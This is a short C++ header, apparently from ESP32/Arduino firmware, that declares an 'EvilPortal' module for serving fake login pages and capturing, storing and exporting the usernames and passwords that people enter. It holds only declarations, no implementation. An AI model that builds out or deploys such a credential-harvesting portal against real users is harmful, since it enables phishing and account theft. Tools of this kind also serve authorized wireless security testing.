#pragma once
#include <ArduinoJson.h>
#include <WString.h>

namespace EvilPortal {
  void init();
  void start(const JsonDocument& params);
  void stop();
  void tick();
  bool isActive();
  const String& currentTemplate();
  const char* loginPageProgmem(); // returns PROGMEM ptr to the right login page
  void captureCredential(const String& username, const String& password, const String& tmpl);
  void fillStatus(JsonDocument& doc);
  String credsJson();
  void clearCreds();
}
